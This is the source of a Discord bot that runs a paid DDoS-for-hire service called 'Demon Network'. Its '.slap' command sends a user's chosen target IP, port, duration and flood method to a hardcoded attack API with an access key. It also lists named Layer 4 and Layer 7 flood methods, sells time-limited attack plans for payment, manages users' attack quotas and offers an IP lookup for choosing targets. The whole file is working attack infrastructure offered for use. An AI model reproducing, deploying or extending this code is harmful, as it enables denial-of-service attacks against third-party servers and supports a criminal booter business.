require('moment-duration-format');
const config = require("./database/configs.json");
const format = require('string-format')
const axios = require('axios');
const cpuStat = require('cpu-stat');
const os = require('os');
const moment = require('moment-timezone');
const setTitle = require('console-title');
const colors = require('colors');
const fs = require('fs');
const users = require('./users.json');
const Discord = require("discord.js"),
        bot = new Discord.Client(),
        client = new Discord.Client();
        
bot.login(config.token);


var cli = new Discord.Client({autoReconnect:true});

var metodos2 = "";


// COLORS
var bred, red, blue, green, yellow, l4cyan, l7yellow, purple, white, lightred, lightgreen, lightpurple, redblink, swhite, whitebolado, underred, blinking, reset;
bred   = '\u001b[0;31m'
red = '\u001b[0;31m';
lightred = '\u001b[91m';
lightgreen = '\u001b[92m';
l4cyan = '\u001b[96m';
l7yellow = '\u001b[93m';
lightpurple = '\u001b[95m';
supered = '\u001b[0;31m';
underred = '\u001b[0;31m';
bgRed = '\u001b[41;92m';
bgGreen = '\u001b[41;92m';
blue  = '\u001b[0;34m';
green = '\u001b[0;32m';
yellow = '\u001b[0;33m';
reset = '\u001b[0m';
purple = '\u001b[0;35m';
white = '\u001b[0;37m';
blinking = '\u001b[0;31;5m';
redblink = '\u001b[101;30;5m';
whitebolado = '\u001b[1;37m';
swhite = '\u001b[0;37m';
//

var timeout = ['50', '140', '124', '84', '520', '302', '410', '1002', '913', '20', '85', '623', '150', '943', '223', '221', '220', '2043', '10', '25', '704', '120', '80']

var SimpleAPI = [
"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}"
];
var NormalAPI = [
"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}"
];

var AdvancedAPI = [
"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}"
];

var servidorADM = [
"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}"
];

var TEMPLATE = ["http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}"]

var emoji = ['🆕']

var Autor = ["𝑅𝐸𝒜𝐿𝑀#1337"]

var soma1 = SimpleAPI.length
var soma2 = AdvancedAPI.length
var soma3 = NormalAPI.length
var soma4 = soma1 + soma2 + soma3

const thumbnails = [
"https://media.discordapp.net/attachments/701004910547959868/701012393731293204/original.gif",
"https://media.discordapp.net/attachments/701004910547959868/701012431845195786/anonymousbackground_d0b4-d0b8-d197.gif",
"https://media.discordapp.net/attachments/701004910547959868/701012532265222144/3105.gif?width=420&height=420",
]
//
setTitle("[" + soma4 +"] Demon │ Coded by: " + Autor);
bot.on("ready", () => {

    console.log('')
    console.log(white + `██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗` + reset + supered + `┌─────────────────────┐` + purple + ` ⇱`)
    console.log(white + `██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║` + reset + supered + `│  ` + reset + `Seja bem vindo a   ` + supered + `│`)
    console.log(white + `██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║` + reset + supered + `│  ` + reset + lightred + `Demon Network` + reset + lightgreen + ` V6   ` + supered + `│` + green + ` 愛`)
    console.log(red +   `██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║` + reset + supered + `├─────────────────────┤` + purple + ` す`)
    console.log(red +   `██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║` + reset + supered + `│ ` + reset + `Twitter: ` + lightgreen + `@Aguiar503` + supered + ` │ ` + green + `る` + reset + supered)
    console.log(red +   `╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝` + reset + supered + `├────────────┬┬───────┤` + reset + supered)
    console.log(bgRed + ` All Rights Reserved ₪ Demon 2018-2020 ` + reset + supered + `│ ` + reset + `Servers: ` + lightgreen + `↑ ` + supered + `├┤ ` + reset + `L4:` + lightgreen + `🅰  ` + supered + `│` + purple + ` 平` + reset + supered)
    console.log(supered + `╔════════════════════╦════╦══════════════════╗` + supered + `├──────────┬─┘├───────` + green + reset + supered + `┤` + green + ` 和`)
    console.log(supered + `║ ` + reset + swhite + ` Terminal of Logs ` + supered + ` ║ ` + reset + yellow + `◄►` + supered + ` ║ ` + reset + swhite + `Demon Network ` + lightgreen + `V6` + supered + ` ║` + supered + `│ ` + reset + `API's:` + lightgreen + ` ↑` + supered + ` │  │ ` + reset + `L7:` + lightgreen + `🅱  ` + reset + supered + `│`)
    console.log(supered + `╚════════════════════╩════╩══════════════════╝` + supered + `└──────────┘  └───────┘` + purple + ` ⇲` + reset);
    console.log()

bot.user.setPresence({
    game: {
        name: `.help | Demon Sec`,
        type: "STREAMING",
        url: "https://twitch.tv/DemonV3"
      }
    }
  );
});

bot.on("disconnect", () => {
     console.log('Disconnected from the Network');
 });

bot.on("reconnecting", () => {
     console.log('Automatic reconnection in progress.');
 });

bot.on('message', async msg => {
const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
const command = args.shift().toLowerCase();
  if(msg.author.bot) {
    return;
  }
  if(msg.channel.type === "dm") {
    return;
  }
  if(msg.content.includes('eae')) {
    msg.channel.send('Hey Whats Up')
    return;
  }
if (msg.author.id !== bot.user.id && msg.content.startsWith(config.prefix)) {

if (command === 'messageedit') {
  let bla = await msg.channel.send('Wait 5 secs')
  setTimeout(function(){
    bla.edit('Edited Success');
  }, 10)
};

////////////////////////////////////////// Commands //////////////////////////////////////////

// Command HELP

if (command === 'help') {

  console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.help ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)

  const response = new Discord.RichEmbed()
    .setColor("#8b1e9b")
    .setAuthor("Welcome To Demon.")
    .setTitle(":flag_br: - Demon - Help Menu - :flag_br:")
    .setDescription("List of all available commands.")
    .setThumbnail((thumbnails[Math.floor(Math.random() * thumbnails.length)]))
    .addField("**[1] __Basic__ :earth_americas:  **", "```yaml\n.buy\n.botinfo\n.userinfo```", true)
    .addField("**[2] __Methods__**", "```http\n.methods\n.methods-l7```", true)
    .addField("**[3] __Tools__**", "```ini\n.lookup  [host]\n.resolve [host]```\n", true)
    .addField("**[4] __List of commands for sending attacks__**", "```ini\n.slap [IPv4] [port] [time] [method]```", true)
    .setTimestamp()
    .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
  
  msg.channel.send(response)

  return;
}

// Command BUY

if (command === 'buy') {
  msg.delete()

  console.log(reset + "[" + l4cyan + moment.tz("America").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.buy ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
  const privbuyembed = new Discord.RichEmbed()
    .setImage("https://media.discordapp.net/attachments/701004910547959868/701012393731293204/original.gif")
    .setColor('#ff0000')
    .setTitle('Demon Security - Buy Menu')
    .setDescription("**__Read First__**\n\nRegardless of the plan you acquire, remember that there are other people to send out attacks. It does not overload servers by sending multiple attacks at the same time or flooding the same host. ", true)
    .addField("```Plans```", "```diff\n-Simples\n-Normal\n-Advanced```", true)
    .addField("```Specification```", "```Time\nSimple = 600 Sec (1 Week)\nNormal = 1200 Sec (1 Months)\nAdvanced = 1800 Sec (3 Months)\n```", true)
    .addField("```PRICE```", "```http\nSimple = $5 \nNormal = $20\nAdvanced = $40\n```", true)
    .addField("```Payment Methods```", "**Paypal And Cashapp Only**")
    .addField("```Payment Details```", "**Akkaibas Paypal | claudia@quirchmayr.de\nRealms Cashapp | realm666\nRealms Paypal | sevhussein@icloud.com**")
  msg.author.send(privbuyembed)
//
  let buyreply = await msg.reply('We  sent a `message to your private dms` containing all plans and prices.')
//  let buyreply1 = await buyreply.react('1⃣')
//  let buyreply2 = await buyreply.react('2⃣')
//  let buyreply3 = await buyreply.react('3⃣')
  buyreply.delete(10000)
  return;
}

// Command METHODS

if (command === 'methods') {

console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.methods ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)

const methodsem = new Discord.RichEmbed()
  .setColor("#ff0000")
  .setTitle(":flag_br: - Demon Network - Methods DDoS - :flag_br:")
  .setThumbnail("https://media.discordapp.net/attachments/683751224721670151/683754179642261629/bc785777947387.png")
  .addField("**Layer 4 UDP**", "```css\nHOME\nCLDAP\nCHARGEN```", true)
  .addField("**Layer 4 UDP**", "```css\nTALK-SHIT\nXOX\nSYN-PAPI\nRIPPED-NIGGA```", true)
  .addField("**Layer 4 Special**", "```HOTSPOT\nNORD-DEAD\nVPN-FUCK\nHTTP-SMACK\nHTTPS-OFF\n```", true)
  .addField("**Layer 4 GAMES**", "```GAME-KILLER\nFN-LAG\nFN-FREEZE\nRAINBOW-DROP\nRAINBOW-FREEZE\n```", true)
  .addField("**Layer 4 TCP**", "```http\nTCP\nDNS\nSTD```", true)        
  .setTimestamp()
  .setFooter("Demon", "https://media.discordapp.net/attachments/683751224721670151/685405339364884503/images.jpg?width=398&height=398");
  
return msg.channel.send(methodsem);
}

// Command METHODS-L7

if (command === 'methods-l7') {
console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.methods-l7 ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)

const methodseml7 = new Discord.RichEmbed()
  .setColor("#ff0000")
  .setTitle(":flag_br: - Demon Network - Methods DDoS - :flag_br:")
  .setThumbnail("https://media.discordapp.net/attachments/683751224721670151/683754179642261629/bc785777947387.png")
  .addField("**Layer 7**", "```WSD\nsSdP\nSmnP\n5M\nGtaFuck\nCOD-deAd```", true)
  .addField("**NOTE**", "> __**Don't spam**__ the fucking\n > attacks or your plan\n > __will be **removed**__.\n\n> Regards, \n> Demon.", true)
  .addField("⠀", "⠀", true)
  .addField("**Layer 7**", "```NFO-UDP\nCF_KILL\nNFO-TCP\nOVH-UDP\nOVH-TCP\nL7200k\nL7800k```", true)
  .addField("**Layer 7**", "```L7800k\nHYDRA-FLASH\n100UP-BYPASS\nCHOOPA-CRUSH\nSAS-DEAD\nNFO-KO\nDEDIRAPE\nDEDI-RAPEV2```", true)    
  .setTimestamp()
  .setFooter("Demon", "https://media.discordapp.net/attachments/683751224721670151/685405339364884503/images.jpg?width=398&height=398");
return msg.channel.send(methodseml7);
}

// Command GIVE

if (command === "give") {
var mention = msg.mentions.members.first();

if (!mention) {
  return msg.reply('mention a user to give a package for him.')
}

const input = args.join(" "),
  userDetails = input.split(" "),
  person = userDetails[0].replace(/[\\<>@#&!]/g, "");
  time = Number(userDetails[1]),
  conc = Number(userDetails[2]),
  length = userDetails[3],
  servers = userDetails[4],
  expire = Number(moment().add(length, "day"));
//
if (!config.admins.includes(msg.author.id))
  return msg.channel.send("You Are Not An Admin.");
//
if (userDetails.length < 5) {
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[DB]` + reset + ` ${msg.author.username} ` + l7yellow + `->` +  lightred + ` Configuração Errada` + reset + ` Status: ` + red + `Preenchimento Incorreto` + reset)
const incorrectUser = new Discord.RichEmbed()
      .setColor("BLACK")
      .setTitle("You entered the data incorrectly")
      .setDescription("```ini\n.give [user] [time] [concurrents] [days] [api/servers]```")
return msg.channel.send(incorrectUser)
}

//
if (!config.servers.servidores.includes(args[4])) {
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[DB]` + reset + ` ${msg.author.username} ` + l7yellow + `->` +  lightred + ` Configuração Errada` + reset + ` Status: ` + red + `Servidor` + reset)
const metodoembed = new Discord.RichEmbed()
  .setColor("#ff0000")
  .setTitle("Database Editor -> Demon")
  .setDescription("An `error` was identified when\nmodifying the database.")
  .addField('**Type:**', '```http\n' + 'Server' + '```', true)
  .addField('Solution:', 'Check the available\nservers in the database', true)
  .setThumbnail(`${msg.author.displayAvatarURL}`)
  .setTimestamp()
  .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
return msg.channel.send(metodoembed); }
//
function updategive(file, json) {
  fs.writeFile(file, JSON.stringify(json, null, 2), "utf8", function(err) {
    console.log(purple + "[" + reset + moment.tz("America/Sao_Paulo").format('HH:mm A') + purple + "] " + `[🧮] Banco de Dados atualizado.`);
  });
}
//
responsegive = new Discord.RichEmbed()
  .setColor("BLACK")
  .setTitle("Database Editor -> Demon")
  .setThumbnail(mention.user.avatarURL)
  .setDescription(`You have modified the <@${person}>\n data in the Demon database.`)
  .addField("Client:", mention.user.username, true)
  .addField("Seconds:", time, true)
  .addField("Concurrent:", conc, true)
  .addField("Days:", length, true)
  .addField("Server", servers, true)
  .addField("Admin:", msg.author.username, true)
  .addField("Client ID:", "```yaml\n" + mention.user.id + "```")
  .addField("Admin ID:", "```http\n" + msg.author.id + "```")
  .setTimestamp()
  .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
//
if (!users[person]) {
  makeUser(person);
}
users[person].attackTime = time;
users[person].concurrents = conc;
users[person].servers = servers;
users[person].expire = moment(expire).unix();
updategive("users.json", users);
return msg.channel.send(responsegive);

}

// Command CLEAR

if (command === "clear") {

const number = "100";
const valor = args[0] - number;
var z = (valor);

if (args < 1) {
  return msg.reply("You filled it out incorrectly.\nTry again like this:\n```ini\n.clear [number of messages]```")
}

if (args[0] > 1000) {
  return msg.reply('you cannot delete more than `1000` messages.')
}

if (!config.admins.includes(msg.author.id)) {
  return msg.reply("You dont have permission to execute this command.");
}

const code = args.join("");
var messagecount = parseInt(code);
msg.channel
 .fetchMessages({ limit: messagecount })
 .then(messages => msg.channel.bulkDelete(messages));

  let deletemessage = await msg.channel.send("> The chat was cleared and `" + args[0] + "` messages were removed.\n> This message will be deleted in 5 seconds.")
  deletemessage.react('✅')
  deletemessage.delete(5000);
  return;
}

// Command BOTINFO

if (command === 'botinfo') {

  let memory = ((process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2))
  let { version } = require("discord.js");
  let botuptime = moment.duration(bot.uptime).format(" H [hrs], m [mins]");

  cpuStat.usagePercent(function(err, percent, seconds) {
    if (err) {
      return console.log(err);
  }

  const response = new Discord.RichEmbed()
  
    .setTitle("*** Demon Stats ***")
    .setColor("RED")
    .setThumbnail(msg.author.displayAvatarURL)
    .addField("Bot:", bot.user, true)
    .addField("Mem Usage", `${memory} %`, true)
    .addField("Uptime ", `${botuptime}`, true)
    .addField("Users", `${bot.users.size.toLocaleString()}`, true)
    .addField("Servers", `${bot.guilds.size.toLocaleString()}`, true)
    .addField("Channels ", `${bot.channels.size.toLocaleString()}`, true)
    .addField("CPU usage", `\`${percent.toFixed(2)}%\``,true)

  msg.channel.send(response)})

  return;
}
// Command USERINFO

if (command === 'userinfo') {
const input = args.join(" ");
const userDetails = input.split(" ");
const mention = msg.mentions.members.first();
const person = userDetails[0].replace(/[\\<>@#&!]/g, "");

  if (!users[msg.author.id]) {
    makeUser(msg.author.id);
  }

  function getRunning(person) {
    let running = 0;
    for (const attack of users[person].attacks) {
      if (attack.stamp > moment().unix() && attack.stopped === false) {
        running++;
      }
    }
    return running;
  }

function getTotal(person) {
  let total = 0;
  for (const attack of users[person].attacks) {
    total++;
  }
  return total;
}
function update(file, json) {
  fs.writeFile(file, JSON.stringify(json, null, 2), "utf8", function(err) {
    console.log(purple + "[" + reset + moment.tz("America/Sao_Paulo").format('HH:mm A') + purple + "] " + `[` +  reset + `${bot.user.username}` + purple + `] Banco de Dados atualizado.`);
  });
}
function makeUser(person) {
  users[person] = {};
  users[person].concurrents = 0;
  users[person].attackTime = 0;
  users[person].attacks = [];
  users[person].expire = null;
  users[person].servers = "Nothing";
  update("users.json", users);
}
function expireDate(person) {
  var expire = moment.unix(users[person].expire);
  if(expire < moment().unix()) return "Expired";
  return expire.format('MMMM Do YYYY, h:mm:ss a');
}
//
if (args < 1) {
  const response = new Discord.RichEmbed()
    .setColor('#000')
    .setThumbnail(`${msg.author.displayAvatarURL}`)
    .setAuthor(`🤖 Minhas informações`)
    .addField('**Username:**', "```css\n" + msg.author.username + "```", true)
    .addField('**Network:**', "```http\n" + users[msg.author.id].servers + "```", true)
    .addField('**Running:**', "```http\n" + getRunning(msg.author.id) + "```", true)
    .addField('**Seconds:**', "```yaml\n" + users[msg.author.id].attackTime + "```", true)
    .addField('**Concurrents:**', "```yaml\n" + users[msg.author.id].concurrents + "```", true)
    .addField('**Attacks:**', "```yaml\n" + getTotal(msg.author.id) + "```", true)
    .addField('**Expire:**', "```http\n" + expireDate(msg.author.id) + "```")
    .addField('**Ray ID:**', "```diff\n-" + msg.author.id + "```")
    .setTimestamp()
    .setFooter(`${msg.author.username} - DemonV6 Botnet.`, `${msg.author.displayAvatarURL}`);
  return msg.channel.send(response)
}
if (!users[person]) {
  makeUser(person);
}

const response = new Discord.RichEmbed()

  .setColor("BLACK")
  .setAuthor(mention.user.username+ " <-- User Information", mention.user.avatarURL)
  .setThumbnail(mention.user.avatarURL)
  .addField('**Username:**', mention.user.username, true)
  .addField('**Network:**', users[person].servers, true)
  .addField('**Running:**', getRunning(mention.user.id), true)
  .addField('**Seconds:**', users[person].attackTime, true)
  .addField('**Concurrents:**', users[person].concurrents, true)
  .addField('**Attacks:**', getTotal(mention.user.id), true)
  .addField('**Expire:**', "```http\n" + expireDate(msg.author.id) + "```")
  .addField('**Ray ID:**', "```diff\n-" + msg.author.id + "```")

return msg.channel.send(response);
}

// Command TRIAL
if (command === "trial") {
  if (!config.admins.includes(msg.author.id)) {
    console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.trial ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
    return msg.channel.send("You are not an admin.");
  };

function update(file, json) {
  fs.writeFile(file, JSON.stringify(json, null, 2), "utf8", function(err) {
    console.log(purple + "[" + reset + moment.tz("America/Sao_Paulo").format('HH:mm A') + purple + "] " + `[` +  reset + `${bot.user.username}` + purple + `] Banco de Dados atualizado.`);
  });
}
  const input = args.join(" "),
    userDetails = input.split(" "),
    person = userDetails[0].replace(/[\\<>@#&!]/g, ""),
    time = 30,
    conc = 1,
    length = userDetails[1],
    expire = Number(moment().add(length, "day")),
    response = new Discord.RichEmbed()
      .setColor("#0099ff")
      .setTitle(":file_folder: > Give")
      .setDescription(`You have updated <@${person}>.`)
      .addField("Concurrents", conc, true)
      .addField("Attack Time", time, true)
      .setTimestamp()
      .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
  if (userDetails.length < 2) {
    return msg.channel.send("Please fill the command in correctly.```" + `${config.prefix}trial <person> <days>` + "```");
  }
  if (!users[person]) {
    makeUser(person);
  }
  users[person].attackTime = time;
  users[person].concurrents = conc;
  users[person].servers = "Simple";
  users[person].expire = moment(expire).unix();
  update("users.json", users);
  return msg.channel.send(response);
}

// Command LOOKUP
if (command === 'lookup') {

if (args.length < 1) {
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Preenchimento Incorreto` + reset + ` Network: ` + purple + `PAID`)
//  
  const lookembed = new Discord.RichEmbed()
    .setColor("#ff0000")
    .setTitle(":flag_br: ERROR LOG :flag_br:")
    .setThumbnail(`${msg.author.displayAvatarURL}`)
    .addField("**Error**", "You filled in the data ***incorrectly***, look at the **correct** form below:")
    .addField("**__Correct Form__**", "```ini\n!lookup [host]```", true)
    .addField("**__Author__**", "```ini\n" + msg.author.username + "```", true)
    .setTimestamp()
    .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
  return msg.channel.send(lookembed);
//
}
const { data } = await axios.get(`http://free.ipwhois.io/json/${args[0]}`),
//
   response = new Discord.RichEmbed()
    .setColor("#249c2b")
    .setTitle(":flag_br: - Demon - Host Lookup Tool - :flag_br:")
    .setDescription("Dados do Host requisitado.")
    .setThumbnail("https://cdn.discordapp.com/attachments/668654887650983936/668678545131831306/1024px-Circle-icons-tools.png")
    .addField("```IP```", "```yaml\n" + data.ip + "```", true)
    .addField("```CONTINENT```", "```yaml\n" + data.continent + "```", true)
    .addField("```TYPE```", "```yaml\n" + data.type + "```", true)
    .addField("```COUNTRY```", "```http\n" + data.country + "```", true)
    .addField("```STATE```", "```http\n" + data.region + "```", true)
    .addField("```CITY```", "```http\n" + data.city + "```", true)
    .addField("```ISP```", "```yaml\n" + data.isp + "```", true)
    .addField("```AUTHOR```", "```yaml\n" + msg.author.username + "```", true)
    .addBlankField(true)
    .setTimestamp()
    .setFooter("GEO-IP LookUP Tool", "https://cdn.discordapp.com/attachments/668654887650983936/668678545131831306/1024px-Circle-icons-tools.png");
    console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + green + `[API] ` + reset + `Tool:` + green + ` GEO-LOOK ` + reset + `Host: ` + green + args[0] + reset + ` Type: ` + green + data.type + reset + ` Author: ` + green + `${msg.author.username}`)
  return msg.channel.send(response);

}
//// Command START

if (command === 'slap') {
//return msg.channel.send("em manutenção, mano / Under Maintenance bro")
      const target = args[0];
      const port = args[1];
      const time = args[2];
      const method = args[3]

function hasPackage(person) {
  var expire = users[person].expire;

  if(expire > moment().unix()) {
    return true;
  } else {
    return false;
  }
}

if (!hasPackage(msg.author.id)) {
  msg.reply('You dont have a package.')
  return;
}

let serverusers;
  if (users[msg.author.id].servers.includes("Simple")) {
    server = SimpleAPI;
    size = SimpleAPI.length;
    network = "Simple";
    plano = "Simples"
  } else if (users[msg.author.id].servers.includes("Normal")) {
    server = NormalAPI;
    size = NormalAPI.length;
    network = "Normal";
    plano = "Normal" 
  } else if (users[msg.author.id].servers.includes("Advanced")) {
    server = AdvancedAPI;
    size = AdvancedAPI.length;
    network = "Advanced";
    plano = "Advanced" 
  } else {
    server = "No Plan"
  }
//
function update(file, json) {
  fs.writeFile(file, JSON.stringify(json, null, 2), "utf8", function(err) {
    console.log(purple + "[" + reset + moment.tz("America/Sao_Paulo").format('HH:mm A') + purple + "] " + `[` +  reset + `${bot.user.username}` + purple + `] Banco de Dados atualizado.`);
  });
}

function makeUser(person) {
  users[person] = {};
  users[person].concurrents = 0;
  users[person].attackTime = 0;
  users[person].attacks = [];
  users[person].expire = null;
  update("users.json", users);
}

if (!users[msg.author.id]) {
  makeUser(msg.author.id);
}

function getRunning(person) {
  let running = 0;
  for (const attack of users[person].attacks) {
    if (attack.stamp > moment().unix() && attack.stopped === false) {
      running++;
    }
  }
  return running;
}

const running = await getRunning(msg.author.id);
if (running >= users[msg.author.id].concurrents) {
  msg.reply("You have much attacks running, wait for one to finish.")
  return;
}

function validatePort(port) {
    if (port > 0 & port < 65535) {
        return (true)
    }
    return (false)
}

if (args.length < 4) {
    msg.reply('blabla')
  return;
}

if(config.blacklist.hosts.includes(args[0])){
  console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `BlackList ` + reset + `Host: ` + green + args[0] + reset + ` Network: ` + purple + `PAID`)
    const blackembed = new Discord.RichEmbed()
      .setColor("#ff0000")
      .setTitle(":flag_br: ERROR LOG :flag_br:")
      .setDescription("BlackList")
      .setThumbnail(`${msg.author.displayAvatarURL}`)
      .addField("**__Error__**", "You cannot send attacks to this Host,\n this ip is on the **Demon BlackList**.", true)
      .addField("**__Host__**", "**" + args[0] + "**", true)
      .setTimestamp()
      .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
    return msg.channel.send(blackembed);
} else {
    if (!args[0] || !args[1] || !args[2] || !args[3]) return;
    if (!validatePort(args[1])) {
      console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Porta inválida` + reset + ` Network: ` + purple + `PAID`)
      const portembed = new Discord.RichEmbed()
        .setColor("#ff0000")
        .setTitle(":flag_br: ERROR LOG :flag_br:")
        .setDescription("Invalid Port")
        .setThumbnail(`${msg.author.displayAvatarURL}`)
        .addField("**__Error__**", "The port you chose cannot be used. You can choose ports between `1` and `65535`.")
        .setTimestamp()
        .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
      return msg.channel.send(portembed);
    }
    for (var i = 0; i < config.methods.layer4.length; i++) {
        metodos2 = metodos2 + config.methods.layer7[i] + " " + config.methods.layer4[i];
    }
    if (!metodos2.includes(args[3].toUpperCase())) {
      console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Método inválido` + reset + ` Network: ` + purple + `PAID`)
      const metodoembed = new Discord.RichEmbed()
        .setColor("#ff0000")
        .setTitle(":flag_br: ERROR LOG :flag_br:")
        .setDescription("Invalid Method")
        .setThumbnail(`${msg.author.displayAvatarURL}`)
        .addField("**__Error__**", "The method you requested was not found in the Demon database, use: `.methods` to check the available methods.", true)
        .addField("**__Host__**", "**" + args[0] + "**", true)
        .setTimestamp()
        .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
      return msg.channel.send(metodoembed);
    }
      if (users[msg.author.id].attackTime < args[2]) {
        console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `TIME` + reset + ` Network: ` + purple + `Simple`)
        const plan1 = new Discord.RichEmbed()
          .setColor("#ff0000")
          .setTitle(":flag_br: ERROR LOG :flag_br:")
          .setDescription("Maximum Time Exceeded")
          .setThumbnail(`${msg.author.displayAvatarURL}`)
          .addField("**__Typed Time__**", "**" + args[2] + "**", true)
          .addField("**__Maximum Time__**", `${users[msg.author.id].attackTime}`, true)
          .addField("**__Your Plan__**", "**Simple**", true)
          .setTimestamp()
          .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
        return msg.channel.send(plan1);
      }
    for (var i = 0; i < server.length; i++) {
        axios.get(format(server[i], target, port, time, method.toUpperCase())).catch(error => {
            console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + "[✘] " + reset + error)
            const embed1 = new Discord.RichEmbed()
              .setColor("#ff0000")
              .setTitle(":flag_br: ERROR LOG :flag_br:")
              .setDescription(error)
              .setThumbnail("https://media.discordapp.net/attachments/691620895386501191/691626561191018661/server.png?width=503&height=400")
              .setTimestamp()
              .setFooter("Server Down - Demon");
            const erros = bot.channels.get(config.channels.error);
            return erros.send(embed1);
        })
    }
//    const { data } = await axios.get(`http://free.ipwhois.io/json/${args[0]}`)
// IMPORTANT: THIS DATA (in up line) DONT WORK IN WEBSITES!!!!!
    const sec = ['SEC']
    const n = ['']
    const embed2 = new Discord.RichEmbed()
      .setAuthor(`A new attack was sent..`,"https://media.discordapp.net/attachments/691620895386501191/698080215787765784/grim-reaper-esport-gaming-mascot-logo-template_20684-278.jpg?width=397&height=397")
      .setTitle("```[🔥] Demon - Attack [🔥]```")
      .setColor("#8b1e9b")
      .setThumbnail("https://media.discordapp.net/attachments/691620895386501191/697867343405121648/wp-otimizacao-guia.png?width=367&height=397")
      .addField("**[1] __Host__**", "```css\n" + target + "```", true)
      .addField("**[2] __Port__**", "```yaml\n" + port + "```", true)
      .addField("**[3] __Time__**", "```glsl\n" + time + " " + sec + "```", true)
      .addField("**[4] __Method__**", "```yaml\n" + method.toUpperCase() + "```", true)
      .addField("**[5] __Servers__**", "```http\n" + size + "```", true)
      .addField("**[6] __Plan__**", "```\n" + users[msg.author.id].servers + "```", true)
      .addField("**[7] __Network__**", "```http\n" + network + "```", true)
      .addField("**[8] __Response__**", "```glsl\n" + (timeout[Math.floor(Math.random() * timeout.length)]) + " ms```", true)
      .addField("**[9] __Moment__**", "```glsl\n" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "```", true)
      //.addField("**[10] __ISP__**", "```http\n" + data.isp + "```")
      .setTimestamp()
      .setFooter(`${msg.author.tag}, sent a new attack.`, `${msg.author.displayAvatarURL}`);
//
      const canal = bot.channels.get(config.channels.logs);
      canal.send(embed2);
//
      let reply = await msg.reply('your attack was successfully sent.\nFor more information, visit <#769299325833969684>.')
      reply.react('✅')
//
      var expirer = moment().add(time, "second");
      users[msg.author.id].attacks.push({
      target,
      port,
      time,
      method: method.toUpperCase(),
      stamp: moment(expirer).unix(),
      stopped: false
    });
    update("users.json", users);
  }
return;
}}
});
